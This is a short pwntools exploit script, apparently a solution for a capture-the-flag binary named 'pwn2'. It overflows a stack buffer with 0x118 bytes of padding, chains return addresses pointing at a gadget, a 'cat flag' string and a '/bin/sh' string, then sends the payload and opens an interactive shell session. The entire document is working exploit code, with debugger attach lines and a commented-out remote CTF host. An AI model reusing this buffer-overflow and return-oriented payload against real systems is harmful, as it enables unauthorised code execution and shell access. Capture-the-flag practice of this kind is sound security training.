from pwn import *

#r = remote("ctf.kuality.kr",12351)
r = process("./pwn2")
gdb.attach(r,"b* 0x0000000000400acd")
r.recvuntil("Input data : ")
#raw_input()
payload = "a"*0x118 + p64(0x400b83)
payload += p64(0x400d41) # cat flag
#payload += p64(0x4006b0)#sh  |
payload += p64(0x7ffff7b97e9a)#/bin/sh
payload += "a"*0xd0
payload += p64(0xdeadbeef)
r.send(payload)
r.interactive()